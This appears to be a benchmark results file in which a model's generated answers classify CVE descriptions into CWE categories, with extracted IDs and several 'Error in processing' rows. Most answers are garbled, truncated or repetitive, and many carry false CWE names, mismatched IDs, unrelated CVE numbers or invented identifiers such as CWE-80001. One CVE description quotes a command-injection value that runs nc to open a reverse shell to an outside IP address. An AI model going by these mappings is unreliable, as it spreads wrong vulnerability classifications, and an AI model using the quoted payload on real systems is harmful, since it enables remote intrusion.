+An improper neutralization of input during web page generation ('cross-site scripting') in Fortinet FortiNAC 9.4.0 - 9.4.2, 9.2.0 - 9.2.8, 9.1.0 - 9.1.10 and 7.2.0 allows an attacker to execute unauthorized code or commands via the name fields observed in the policy audit logs.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: An improper neutralization of input during web page generation ('cross-site scripting') in Fortinet FortiNAC 9.4.0 - 9.4.2, 9.2.0 - 9.2.8, 9.1.0 - 9.1.10 and 7.2.0 allows an attacker to execute unauthorized code or commands via the name fields observed in the policy audit logs.
+```
+CVE-2018-16853
+```
+```
+CWE-20
+```
+## Analysis
+
+This vulnerability is caused by an improper neutralization of input during web page generation. The input is processed before being sent to the browser"	CWE-20
+The Qyrr WordPress plugin before 0.7 does not escape the data-uri of the QR Code when outputting it in a src attribute, allowing for Cross-Site Scripting attacks. Furthermore, the data_uri_to_meta AJAX action, available to all authenticated users, only had a CSRF check in place, with the nonce available to users with a role as low as Contributor allowing any user with such role (and above) to set a malicious data-uri in arbitrary QR Code posts, leading to a Stored Cross-Site Scripting issue.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: The Qyrr WordPress plugin before 0.7 does not escape the data-uri of the QR Code when outputting it in a src attribute, allowing for Cross-Site Scripting attacks. Furthermore, the data_uri_to_meta AJAX action, available to all authenticated users, only had a CSRF check in place, with the nonce available to users with a role as low as Contributor allowing any user with such role (and above) to set a malicious data-uri in arbitrary QR Code posts, leading to a Stored Cross-Site Scripting issue.
+CWE ID: CWE-79: Improper Control of Output (Cross-site Scripting)
+The last part of your response should contain only the CWE ID number.
+
+## Solution
+
+The Qyrr WordPress plugin before 0.7 does not escape"	CWE-79
+Cross-Site Request Forgery (CSRF) vulnerability in DroitThemes Droit Elementor Addons – Widgets, Blocks, Templates Library For Elementor Builder.This issue affects Droit Elementor Addons – Widgets, Blocks, Templates Library For Elementor Builder: from n/a through 3.1.5.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: Cross-Site Request Forgery (CSRF) vulnerability in DroitThemes Droit Elementor Addons – Widgets, Blocks, Templates Library For Elementor Builder.This issue affects Droit Elementor Addons – Widgets, Blocks, Templates Library For Elementor Builder: from n/a through 3.1.5.
+```
+1. CWE-79: Improper Neutralization of Input During Web Page Generation (“Cross-Site Request Forgery”) 
+```
+```
+2. CWE-79: Improper Neutralization of Input During Web Page Generation (“Cross-S"	CWE-79
+Cross Site Scripting (XSS) vulnerability in AVA teaching video application service platform version 3.1, allows remote attackers to execute arbitrary code via a crafted script to ajax.aspx.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: Cross Site Scripting (XSS) vulnerability in AVA teaching video application service platform version 3.1, allows remote attackers to execute arbitrary code via a crafted script to ajax.aspx.
+CVSS v3 Base Score: 7.8
+CWE ID: CWE-79
+CWE Description: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection') - Stored Data Manipulation
+The vulnerability is caused"	CWE-79
+Open edX Platform is a service-oriented platform for authoring and delivering online learning. A user with a JWT and more limited scopes could call endpoints exceeding their access. This vulnerability has been patched in commit 019888f.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: Open edX Platform is a service-oriented platform for authoring and delivering online learning. A user with a JWT and more limited scopes could call endpoints exceeding their access. This vulnerability has been patched in commit 019888f.
+CWE ID: CWE-22: Improper Limitation of a Pathname to a Restricted Directory
+CVE ID: CVE-2020-13809
+CWE ID: CWE-22: Improper Limitation of a Pathname to a"	CWE-22
+Cross Site Scripting (XSS) vulnerability in beetl-bbs 2.0 allows attackers to run arbitrary code via the /index keyword parameter.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: Cross Site Scripting (XSS) vulnerability in beetl-bbs 2.0 allows attackers to run arbitrary code via the /index keyword parameter.
+CWE ID: CWE-79: Improper Control of External Data
+
+## Analysis
+
+The vulnerability is due to a cross-site scripting (XSS) vulnerability in beetl-bbs 2.0. The vulnerability occurs when the beetl-b"	CWE-79
+Multiple memory corruption issues were addressed with improved memory handling. This issue is fixed in macOS Sonoma 14.3, iOS 16.7.5 and iPadOS 16.7.5, iOS 17.3 and iPadOS 17.3. Processing maliciously crafted web content may lead to arbitrary code execution.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: Multiple memory corruption issues were addressed with improved memory handling. This issue is fixed in macOS Sonoma 14.3, iOS 16.7.5 and iPadOS 16.7.5, iOS 17.3 and iPadOS 17.3. Processing maliciously crafted web content may lead to arbitrary code execution.
+The following CWEs are associated with this vulnerability:
+CVE-2022-39172 CWE-121 CWE-121 CWE-121 CWE-121 CWE-121 CWE-121 CWE-121 CWE-121 CWE-121 CWE-121 CWE-121"	CWE-121
+The WP Recipe Maker plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the plugin's 'wprm-recipe-text-share' shortcode in all versions up to, and including, 9.1.0 due to insufficient input sanitization and output escaping on user supplied attributes. This makes it possible for authenticated attackers with contributor-level and above permissions to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: The WP Recipe Maker plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the plugin's 'wprm-recipe-text-share' shortcode in all versions up to, and including, 9.1.0 due to insufficient input sanitization and output escaping on user supplied attributes. This makes it possible for authenticated attackers with contributor-level and above permissions to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page.
+CWE ID: CWE-79
+
+Justification: The WP Recipe Maker plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the plugin's 'wprm-recipe-text-share' shortcode in all versions up to, and including,"	CWE-79
+The vulnerability allows a remote unauthenticated attacker to read arbitrary content of the results database via a crafted HTTP request.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: The vulnerability allows a remote unauthenticated attacker to read arbitrary content of the results database via a crafted HTTP request.
+```
+CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
+```
+The vulnerability allows a remote unauthenticated attacker to read arbitrary content of the results database via a crafted HTTP request.
+```
+C"	CWE-79
+uev (aka libuev) before 2.4.1 has a buffer overflow in epoll_wait if maxevents is a large number.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: uev (aka libuev) before 2.4.1 has a buffer overflow in epoll_wait if maxevents is a large number.
+```
+CVE-2017-17133
+```
+```
+CWE-119
+```
+```
+CWE-119
+```
+```
+CWE-119
+```
+```
+CWE-119
+```
+```"	CWE-119
+A vulnerability was found in Kashipara Food Management System 1.0. It has been rated as critical. Affected by this issue is some unknown functionality of the file itemBillPdf.php. The manipulation of the argument printid leads to sql injection. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. The identifier of this vulnerability is VDB-249848.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: A vulnerability was found in Kashipara Food Management System 1.0. It has been rated as critical. Affected by this issue is some unknown functionality of the file itemBillPdf.php. The manipulation of the argument printid leads to sql injection. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. The identifier of this vulnerability is VDB-249848.
+The CWE name is CWE-89: SQL Injection. The CWE description is: An input validation or input sanitization error occurs when input data is not properly filtered or validated before being used in an application. Input validation is a security technique that can be"	CWE-89
+An issue was discovered in Atos Unify OpenScape Voice Trace Manager V8 before V8 R0.9.11. It allows authenticated path traversal in the user interface.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: An issue was discovered in Atos Unify OpenScape Voice Trace Manager V8 before V8 R0.9.11. It allows authenticated path traversal in the user interface.
+CWE ID: CWE-200: Improper Input Validation
+CVE Reference: CVE-2016-10081
+
+## Response
+
+The CWE ID is 200. The CWE definition is ""Improper Input Validation"". This means that the CWE indicates"	CWE-200
+Cross Site Scripting (XSS) vulnerability in JFinalcms 5.0.0 allows attackers to run arbitrary code via the name field when creating a new custom table.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: Cross Site Scripting (XSS) vulnerability in JFinalcms 5.0.0 allows attackers to run arbitrary code via the name field when creating a new custom table.
+```
+CWE-79: Improper Neutralization of Special Elements used in a Command ('XSS') 
+```
+```
+CWE-79: Improper Neutralization of Special Elements used in a Command ('XSS') 
+```"	CWE-79
+Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in Bradley B. Dalina Image Tag Manager allows Reflected XSS.This issue affects Image Tag Manager: from n/a through 1.5.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in Bradley B. Dalina Image Tag Manager allows Reflected XSS.This issue affects Image Tag Manager: from n/a through 1.5.
+CWE ID: CWE-79 (Improper Neutralization of Input During Web Page Generation)
+CWE ID: CWE-20 (Improper Neutralization of Special Elements used in an OS Command)
+CWE ID: CWE-22 (Improper"	CWE-79
+A vulnerability was found in Tenda W9 1.0.0.7(4456). It has been declared as critical. Affected by this vulnerability is the function formAddSysLogRule of the component httpd. The manipulation of the argument sysRulenEn leads to stack-based buffer overflow. The attack can be launched remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-250711. NOTE: The vendor was contacted early about this disclosure but did not respond in any way.	Error in processing	Error
+A vulnerability was found in MiczFlor RPi-Jukebox-RFID up to 2.5.0. It has been rated as critical. Affected by this issue is some unknown functionality of the file userScripts.php of the component HTTP Request Handler. The manipulation of the argument folder with the input ;nc 104.236.1.147 4444 -e /bin/bash; leads to os command injection. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. The identifier of this vulnerability is VDB-251540. NOTE: The vendor was contacted early about this disclosure but did not respond in any way.	Error in processing	Error
+A buffer overflow vulnerability in TA for Linux and TA for MacOS prior to 5.8.1 allows a local user to gain elevated permissions, or cause a Denial of Service (DoS), through exploiting a memory corruption issue in the TA service, which runs as root. This may also result in the disabling of event reporting to ePO, caused by failure to validate input from the file correctly.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: A buffer overflow vulnerability in TA for Linux and TA for MacOS prior to 5.8.1 allows a local user to gain elevated permissions, or cause a Denial of Service (DoS), through exploiting a memory corruption issue in the TA service, which runs as root. This may also result in the disabling of event reporting to ePO, caused by failure to validate input from the file correctly.
+CWE ID: CWE-200 (Improper Limitation of a Path Name)
+CWE ID: CWE-200 (Improper Limitation of a Path Name)
+CWE ID: CWE-200 (Improper Limitation of a Path Name"	CWE-200
+Insecure Direct Object Reference vulnerabilities were discovered in the Avaya Aura Experience Portal Manager which may allow partial information disclosure to an authenticated non-privileged user. Affected versions include 8.0.x and 8.1.x, prior to 8.1.2 patch 0402. Versions prior to 8.0 are end of manufacturer support.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: Insecure Direct Object Reference vulnerabilities were discovered in the Avaya Aura Experience Portal Manager which may allow partial information disclosure to an authenticated non-privileged user. Affected versions include 8.0.x and 8.1.x, prior to 8.1.2 patch 0402. Versions prior to 8.0 are end of manufacturer support.
+The CVE ID is: CVE-2019-10829
+The CWE ID is: CWE-200
+The CWE Description is: An application vulnerability in which an application contains a vulnerability that allows an attacker to disclose information that is not intended for disclosure"	CWE-200
+In Modem IMS SMS UA, there is a possible out of bounds write due to a missing bounds check. This could lead to remote denial of service with no additional execution privileges needed. User interaction is not needed for exploitation. Patch ID: MOLY00730807; Issue ID: MOLY00730807.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: In Modem IMS SMS UA, there is a possible out of bounds write due to a missing bounds check. This could lead to remote denial of service with no additional execution privileges needed. User interaction is not needed for exploitation. Patch ID: MOLY00730807; Issue ID: MOLY00730807.
+CWE ID: CWE-362 CWE-362: Improper Limitation of a Pathname to a Restricted Directory
+The CWE-362 standard provides a method for classifying CWEs into a hierarchy of classes. Each class in the hierarchy represents a"	CWE-362
+A Universal Cross Site Scripting (UXSS) vulnerability in ClassLink OneClick Extension through 10.8 allows remote attackers to inject JavaScript into any webpage. NOTE: this issue exists because of an incomplete fix for CVE-2022-48612.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: A Universal Cross Site Scripting (UXSS) vulnerability in ClassLink OneClick Extension through 10.8 allows remote attackers to inject JavaScript into any webpage. NOTE: this issue exists because of an incomplete fix for CVE-2022-48612.
+```
+CWE-79: Improper Neutralization of Input During Web Page Generation (""Cross Site Scripting"")
+```
+## Solution
+
+  - CWE-79 is a CWE for Improper Neutralization of Input During Web Page Generation. It is"	CWE-79
+A vulnerability was found in code-projects Fighting Cock Information System 1.0. It has been classified as critical. This affects an unknown part of the file /admin/action/new-feed.php. The manipulation of the argument type_feed leads to sql injection. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-250593 was assigned to this vulnerability.	Error in processing	Error
+DOM-based Cross Site Scripting (XSS vulnerability in 'Tail Event Logs' functionality in Nagios Nagios Cross-Platform Agent (NCPA) before 2.4.0 allows attackers to run arbitrary code via the name element when filtering for a log.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: DOM-based Cross Site Scripting (XSS vulnerability in 'Tail Event Logs' functionality in Nagios Nagios Cross-Platform Agent (NCPA) before 2.4.0 allows attackers to run arbitrary code via the name element when filtering for a log.
+```
+CWE-79: Improper Control of Input
+```
+## Analysis
+
+The vulnerability is present in the Nagios Nagios Cross-Platform Agent (NCPA) version 2.4.0. The NCPA is"	CWE-79
+Employee Managment System v1.0 was discovered to contain a SQL injection vulnerability via the id parameter at /edit.php.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: Employee Managment System v1.0 was discovered to contain a SQL injection vulnerability via the id parameter at /edit.php.
+CWE ID: CWE-89: Improper Neutralization of Special Elements used in SQL
+Justification: This vulnerability is caused by a SQL injection vulnerability. This is a CWE identifier. This vulnerability is also known as SQL injection. The CWE identifier"	CWE-89
+The Advanced Custom Fields (ACF) plugin for WordPress is vulnerable to Stored Cross-Site Scripting via a custom text field in all versions up to, and including, 6.2.4 due to insufficient input sanitization and output escaping. This makes it possible for authenticated attackers, with contributor-level access and above, to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: The Advanced Custom Fields (ACF) plugin for WordPress is vulnerable to Stored Cross-Site Scripting via a custom text field in all versions up to, and including, 6.2.4 due to insufficient input sanitization and output escaping. This makes it possible for authenticated attackers, with contributor-level access and above, to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page.
+CVE ID: CVE-2021-44930
+CWE ID: CWE-79
+
+Explanation:
+The plugin is vulnerable to Stored Cross-Site Scripting (XSS) because the input sanitization and output escaping are not sufficient to prevent the"	CWE-79
+Code-projects Simple School Managment System 1.0 allows SQL Injection via the 'name' parameter at School/teacher_login.php.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: Code-projects Simple School Managment System 1.0 allows SQL Injection via the 'name' parameter at School/teacher_login.php.
+CWE ID: CWE-89: Improper Input Validation
+
+SQL Injection is a common security vulnerability in web applications. It allows an attacker to inject SQL commands into a database, which can be used to compromise the security of the application. This vulnerability"	CWE-89
+The Voting Record WordPress plugin through 2.0 is missing sanitisation as well as escaping, which could allow any authenticated users, such as subscriber to perform Stored XSS attacks	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: The Voting Record WordPress plugin through 2.0 is missing sanitisation as well as escaping, which could allow any authenticated users, such as subscriber to perform Stored XSS attacks
+CWE ID: CWE-79
+Justification: The plugin allows user to add a comment, which can be stored in the database and displayed to other users. The plugin does not provide any sanitization or escaping of the user input, which can"	CWE-79
+A vulnerability, which was classified as critical, has been found in Tenda AC10 16.03.10.13/16.03.10.20. Affected by this issue is the function fromSetSysTime of the file /goform/SetSysTimeCfg. The manipulation of the argument timeZone leads to stack-based buffer overflow. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. The identifier of this vulnerability is VDB-257780. NOTE: The vendor was contacted early about this disclosure but did not respond in any way.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: A vulnerability, which was classified as critical, has been found in Tenda AC10 16.03.10.13/16.03.10.20. Affected by this issue is the function fromSetSysTime of the file /goform/SetSysTimeCfg. The manipulation of the argument timeZone leads to stack-based buffer overflow. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. The identifier of this vulnerability is VDB-257780. NOTE: The vendor was contacted early about this disclosure but did not respond in any way.
+CWE ID: CWE-80001
+CWE Description: A buffer overflow vulnerability exists in the Tenda AC10 16.03.10.13/16.03.10.20 firmware. This vulnerability allows remote attackers to execute arbitrary"	CWE-80001
+PX4 Autopilot 1.14 and earlier, due to the lack of synchronization mechanism for loading geofence data, has a Race Condition vulnerability in the geofence.cpp and mission_feasibility_checker.cpp. This will result in the drone uploading overlapping geofences and mission routes.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: PX4 Autopilot 1.14 and earlier, due to the lack of synchronization mechanism for loading geofence data, has a Race Condition vulnerability in the geofence.cpp and mission_feasibility_checker.cpp. This will result in the drone uploading overlapping geofences and mission routes.
+Solution: CWE-119
+
+The following CWE ID numbers were found in the CVE description. CWE-119 is the only one that meets the criteria for this exercise."	CWE-119
+Twister Antivirus v8.17 is vulnerable to an Out-of-bounds Read vulnerability by triggering the 0x801120B8 IOCTL code of the filmfd.sys driver.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: Twister Antivirus v8.17 is vulnerable to an Out-of-bounds Read vulnerability by triggering the 0x801120B8 IOCTL code of the filmfd.sys driver.
+CWE ID: CWE-787: Out-of-bounds Read
+CWE Description: A buffer over-read vulnerability exists in the way Twister Antivirus 8.17 handles the IOCTL code of the filmfd.sys driver. This allows an attacker"	CWE-787
+The CommentTweets WordPress plugin through 0.6 does not have CSRF checks in some places, which could allow attackers to make logged in users perform unwanted actions via CSRF attacks	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: The CommentTweets WordPress plugin through 0.6 does not have CSRF checks in some places, which could allow attackers to make logged in users perform unwanted actions via CSRF attacks
+```
+CWE-99: Cross-Site Request Forgery
+```
+CWE-99 is the most severe of the four Common Weakness Enumeration (CWE) categories. This category includes vulnerabilities that allow an attacker to trick a user into"	CWE-99
+A vulnerability was found in Totolink LR1200GB 9.1.0u.6619_B20230130. It has been classified as critical. This affects the function setTracerouteCfg of the file /cgi-bin/cstecgi.cgi. The manipulation of the argument command leads to stack-based buffer overflow. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-250791. NOTE: The vendor was contacted early about this disclosure but did not respond in any way.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: A vulnerability was found in Totolink LR1200GB 9.1.0u.6619_B20230130. It has been classified as critical. This affects the function setTracerouteCfg of the file /cgi-bin/cstecgi.cgi. The manipulation of the argument command leads to stack-based buffer overflow. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-250791. NOTE: The vendor was contacted early about this disclosure but did not respond in any way.
+The CWE description: CWE-20: Improper Limitation of a Pathname to a Restricted Directory
+
+A vulnerability was found in Totolink LR1200GB 9.1.0u.6619_B20230130. It has"	CWE-20
+A phishing site could have repurposed an `about:` dialog to show phishing content with an incorrect origin in the address bar. This vulnerability affects Firefox < 122 and Thunderbird < 115.7.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: A phishing site could have repurposed an `about:` dialog to show phishing content with an incorrect origin in the address bar. This vulnerability affects Firefox < 122 and Thunderbird < 115.7.
+```
+https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-33890
+```
+```
+CWE-264 - Cross-site Scripting (XSS)
+CWE-264 - Cross"	CWE-264
+CubeFS is an open-source cloud-native file storage system. CubeFS prior to version 3.3.1 was found to leak users secret keys and access keys in the logs in multiple components. When CubeCS creates new users, it leaks the users secret key. This could allow a lower-privileged user with access to the logs to retrieve sensitive information and impersonate other users with higher privileges than themselves. The issue has been patched in v3.3.1. There is no other mitigation than upgrading CubeFS.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: CubeFS is an open-source cloud-native file storage system. CubeFS prior to version 3.3.1 was found to leak users secret keys and access keys in the logs in multiple components. When CubeCS creates new users, it leaks the users secret key. This could allow a lower-privileged user with access to the logs to retrieve sensitive information and impersonate other users with higher privileges than themselves. The issue has been patched in v3.3.1. There is no other mitigation than upgrading CubeFS.
+CWE ID: CWE-305 - Improper Restriction of Access Control
+CWE ID: CWE-305 - Improper Restriction of Access Control
+CWE ID: CWE-305 - Improper Restriction of Access Control
+CWE"	CWE-305
+A buffer overflow vulnerability exists in Delta Electronics Delta Industrial Automation DOPSoft version 2 when parsing the wKPFStringLen field of a DPS file. An anonymous attacker can exploit this vulnerability by enticing a user to open a specially crafted DPS file to achieve code execution.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: A buffer overflow vulnerability exists in Delta Electronics Delta Industrial Automation DOPSoft version 2 when parsing the wKPFStringLen field of a DPS file. An anonymous attacker can exploit this vulnerability by enticing a user to open a specially crafted DPS file to achieve code execution.
+```
+CWE-200: Improper Input Validation
+CWE-79: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
+CWE-79: Improper Neutralization of Special Elements used in an SQL Command"	CWE-200
+In the Linux kernel, the following vulnerability has been resolved:  tls: fix race between async notify and socket close  The submitting thread (one which called recvmsg/sendmsg) may exit as soon as the async crypto handler calls complete() so any code past that point risks touching already freed data.  Try to avoid the locking and extra flags altogether. Have the main thread hold an extra reference, this way we can depend solely on the atomic ref counter for synchronization.  Don't futz with reiniting the completion, either, we are now tightly controlling when completion fires.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: In the Linux kernel, the following vulnerability has been resolved:  tls: fix race between async notify and socket close  The submitting thread (one which called recvmsg/sendmsg) may exit as soon as the async crypto handler calls complete() so any code past that point risks touching already freed data.  Try to avoid the locking and extra flags altogether. Have the main thread hold an extra reference, this way we can depend solely on the atomic ref counter for synchronization.  Don't futz with reiniting the completion, either, we are now tightly controlling when completion fires.
+CWE ID: 20 (Insecure Direct Object Reference)
+The CWE definition of this vulnerability is:
+CWE-20: An insecure direct object reference occurs when a dereferencing of an object that does not point to an existing object results in"	CWE-20
+The Advanced iFrame plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the plugin's 'advanced_iframe' shortcode in all versions up to, and including, 2023.10 due to insufficient input sanitization and output escaping on user supplied attributes. This makes it possible for authenticated attackers with contributor-level and above permissions to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page. CVE-2024-24870 is likely a duplicate of this issue.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: The Advanced iFrame plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the plugin's 'advanced_iframe' shortcode in all versions up to, and including, 2023.10 due to insufficient input sanitization and output escaping on user supplied attributes. This makes it possible for authenticated attackers with contributor-level and above permissions to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page. CVE-2024-24870 is likely a duplicate of this issue.
+CWE ID: CWE-79: Improper Input Validation
+CWE ID: CWE-79: Improper Input Validation
+CWE ID: CWE-79: Improper Input Validation
+
+## Response
+
+The last part of your response should contain"	CWE-79
+Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in Biteship Biteship: Plugin Ongkos Kirim Kurir Instant, Reguler, Kargo allows Reflected XSS.This issue affects Biteship: Plugin Ongkos Kirim Kurir Instant, Reguler, Kargo: from n/a through 2.2.24.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in Biteship Biteship: Plugin Ongkos Kirim Kurir Instant, Reguler, Kargo allows Reflected XSS.This issue affects Biteship: Plugin Ongkos Kirim Kurir Instant, Reguler, Kargo: from n/a through 2.2.24.
+CWE ID: CWE-79
+CWE Description: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
+Solution: Upgrade to 2.2.25
+Solution: Upgrade to 2.2.25"	CWE-79
+IBM InfoSphere Information Server 11.7 stores potentially sensitive information in log files that could be read by a local user.  IBM X-Force ID:  280361.	Error in processing	Error
+The WP Review Slider WordPress plugin before 13.0 does not sanitise and escape some of its settings, which could allow high privilege users such as admin to perform Stored Cross-Site Scripting attacks even when the unfiltered_html capability is disallowed (for example in multisite setup)	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: The WP Review Slider WordPress plugin before 13.0 does not sanitise and escape some of its settings, which could allow high privilege users such as admin to perform Stored Cross-Site Scripting attacks even when the unfiltered_html capability is disallowed (for example in multisite setup)
+CWE ID: CWE-89
+
+WP Review Slider is a WordPress plugin that allows users to embed videos from YouTube, Vimeo, and Dailymotion into their website. The plugin is not vulnerable to the issue described in this advisory, as it"	CWE-89
+An integer overflow was addressed through improved input validation. This issue is fixed in tvOS 16.4, macOS Big Sur 11.7.5, iOS 16.4 and iPadOS 16.4, watchOS 9.4, macOS Monterey 12.6.4, iOS 15.7.4 and iPadOS 15.7.4. An app may be able to cause a denial-of-service.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: An integer overflow was addressed through improved input validation. This issue is fixed in tvOS 16.4, macOS Big Sur 11.7.5, iOS 16.4 and iPadOS 16.4, watchOS 9.4, macOS Monterey 12.6.4, iOS 15.7.4 and iPadOS 15.7.4. An app may be able to cause a denial-of-service.
+CVE ID: CVE-2022-40231
+
+CWE ID: CWE-119
+
+Justification:
+
+This issue is fixed in tvOS 16.4, macOS Big Sur 11.7.5, iOS 16.4 and"	CWE-119
+Dell PowerScale OneFS versions 9.0.0.x through 9.6.0.x contains a missing authentication for critical function vulnerability. A low privileged local malicious user could potentially exploit this vulnerability to gain elevated access.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: Dell PowerScale OneFS versions 9.0.0.x through 9.6.0.x contains a missing authentication for critical function vulnerability. A low privileged local malicious user could potentially exploit this vulnerability to gain elevated access.
+CVE ID: CVE-2021-3898
+CWE ID: CWE-1000
+Description: The function that handles the authentication of a user when a new user is created does not properly check the password. This allows a low privileged local"	CWE-1000
